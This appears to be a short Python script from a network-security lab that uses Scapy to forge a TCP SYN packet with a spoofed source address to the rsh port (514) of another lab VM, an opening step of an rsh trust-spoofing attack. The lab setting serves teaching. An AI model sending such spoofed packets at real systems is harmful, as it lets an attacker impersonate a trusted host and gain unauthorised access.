#!/usr/bin/python3
from scapy.all import *

# Define IP addresses and MAC addresses
VM_SERVER = "10.0.2.5"  # Host A's IP
VM_X_TERM = "10.0.2.6"  # Host B's IP
VM_X_TERM_MAC = "08:00:27:05:41:63"

e = Ether(dst = VM_X_TERM_MAC)

a = IP()
a.src = VM_SERVER
a.dst = VM_X_TERM

b = TCP()
b.sport = 1023
b.dport = 514
b.seq = 1000
b.flags = "S"

pkt = e/a/b
sendp(pkt)